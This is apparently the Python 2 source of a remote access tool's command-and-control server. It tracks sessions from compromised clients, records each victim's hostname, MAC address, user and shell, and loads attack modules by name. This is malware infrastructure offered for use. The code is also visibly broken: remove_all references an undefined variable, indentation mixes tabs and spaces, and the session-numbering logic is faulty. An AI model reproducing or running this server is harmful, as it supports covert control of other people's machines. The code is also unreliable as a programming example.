import crispy.modules
import logging
import pkgutil
import SocketServer

logger = logging.getLogger(__name__)

from . client import CrispyClient
from .. network.handler import ThreadedTCPRequestHandler

class ThreadedTCPServer(SocketServer.ThreadingMixIn, SocketServer.TCPServer):
    """ Backend server methods for clients. """

    def __init__(self, server_address, handler_class=ThreadedTCPRequestHandler):
        self.allow_reuse_address = True
        self.clients = []
        self.current_id = 1
        SocketServer.TCPServer.__init__(self, server_address, handler_class)

    def add_client(self, conn, l):
        """ Add new client to client list. """
	logger.debug("add_session() was called")
	cc = CrispyClient({"conn":conn, "id":self.current_id, "ip":conn.client_address[0], "macaddr":l[0], "hostname":l[1], "plat":l[2], 
		"proc_type":l[3], "proc_arch":l[4], "uptime":l[5], "date":l[6], "user":l[7], "home":l[8], "shell":l[9]})
	logger.info("Session {} opened ({}:{} <- {}:{})".format(self.current_id, self.server_address[0], self.server_address[1], conn.client_address[0], conn.client_address[1]))
	self.clients.append(cc)
	self.current_id += 1

    def remove_client(self, conn):
        """ Remove client from client list. """
	logger.debug("remove_client() was called")
	for client in self.clients:
	    if client.get_session() is conn:
                self.clients.remove(client)
	        self.current_id -= 1

    def remove_client_id(self, id): 
    	""" Remove client given an id from client list. """
	logger.debug("remove_client_id() was called")
	self.clients.remove(self.get_client(id))
	self.current_id -= 1

    def remove_all(self):
        """ Remove all clients from list. """
        while len(self.clients) > 0:
            client.get_session().close()
            self.clients.remove(client)

    def get_client_list(self):
        """ Return a list of clients connected to the C2 server. """
	logger.debug("get_client_list() was called")
        return self.clients

    def get_client(self, id):
	""" Return client given session id. """
	logger.debug("get_client() was called")
	for client in self.clients:
	    if client.get_id() == id:
		return client

    def get_modules(self):
	""" Iterate over all modules. """
	logger.debug("get_modules() was called")
	mods = []
	for module_loader, module_name, ispkg in pkgutil.iter_modules(crispy.modules.__path__):
	    mods.append(module_name)
	return sorted(mods)

    def get_module(self, name):
	""" Return a module by name. """
	logger.debug("get_module() was called")
	for module_loader, module_name, ispkg in pkgutil.iter_modules(crispy.modules.__path__):
	    if module_name == name:
		module = module_loader.find_module(module_name).load_module(module_name)
		class_name = None
		
		if hasattr(module, "__class_name__"):
		    class_name = module.__class_name__
		return getattr(module, class_name)
